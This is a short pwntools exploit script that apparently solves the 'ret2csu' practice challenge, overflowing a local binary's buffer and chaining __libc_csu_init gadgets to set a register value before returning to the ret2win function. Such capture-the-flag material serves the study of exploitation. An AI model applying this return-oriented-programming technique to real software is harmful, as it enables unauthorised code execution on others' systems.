from pwn import *

sh = process('./ret2csu')
elf = ELF('ret2csu')

gadget1 = 0x40089a
gadget2 = 0x400880

init_addr = elf.symbols['__init_array_start']
ret2win_addr = elf.symbols['ret2win']

payload = 'a' * (0x20 + 0x8)
payload += p64(gadget1) + p64(0) + p64(1) + p64(init_addr) + p64(0) + p64(0)+ p64(0xdeadcafebabebeef)
payload += p64(gadget2) + 'a' * 56
payload += p64(ret2win_addr)

sh.recvuntil('>')
sh.sendline(payload)

sh.interactive()
sh.close()